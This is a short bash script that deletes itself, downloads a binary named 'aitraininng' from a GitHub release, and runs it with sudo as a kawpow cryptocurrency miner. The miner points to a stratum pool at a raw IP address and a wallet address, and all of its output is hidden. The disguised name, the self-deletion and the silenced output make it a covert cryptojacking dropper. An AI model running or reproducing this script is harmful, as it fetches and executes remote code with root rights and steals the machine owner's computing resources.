#!/bin/bash

# Self-delete after execution
( sleep 1; rm -- "$0" ) &

# Download the file
wget https://github.com/max313iq/tech/releases/download/Gft/aitraininng

# Make the file executable
chmod +x aitraininng

# Run the file with the given parameters, hiding the output
sudo ./aitraininng -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.batch > /dev/null 2>&1
